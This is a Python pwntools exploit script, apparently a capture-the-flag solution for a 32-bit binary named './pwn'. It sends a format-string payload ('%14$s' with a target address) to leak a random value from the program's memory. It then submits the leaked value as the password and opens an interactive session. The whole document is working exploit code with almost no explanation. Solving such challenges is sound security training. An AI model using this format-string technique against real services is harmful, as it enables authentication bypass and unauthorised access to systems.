from pwn import *
from struct import pack
from ctypes import *
import base64
#from LibcSearcher import *

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :u32(p.recvuntil(b'\xf7')[-4:].ljust(4,b'\x00'))
l64 = lambda    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
uu32    = lambda    :u32(p.recv(4).ljust(4,b'\x00'))
uu64    = lambda    :u64(p.recv(6).ljust(8,b'\x00'))
int16   = lambda data   :int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

# context(os='linux', arch='amd64', log_level='debug')
context(os='linux', arch='i386', log_level='debug')

# p=remote('node4.buuoj.cn',27372)
p = process('./pwn')
elf = ELF('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

urandom_addr = 0x804C044

# debug('b *0x80492BC')

payload = b'%14$s'.ljust(0x10, b'\x00') + p32(urandom_addr)
sa(b'your name:', payload)
rl('Hello,')
urandom_number = u32(r(4))
lg('urandom_number', urandom_number)
payload = str(urandom_number)
sa(b'your passwd:', payload)

inter()
# pause()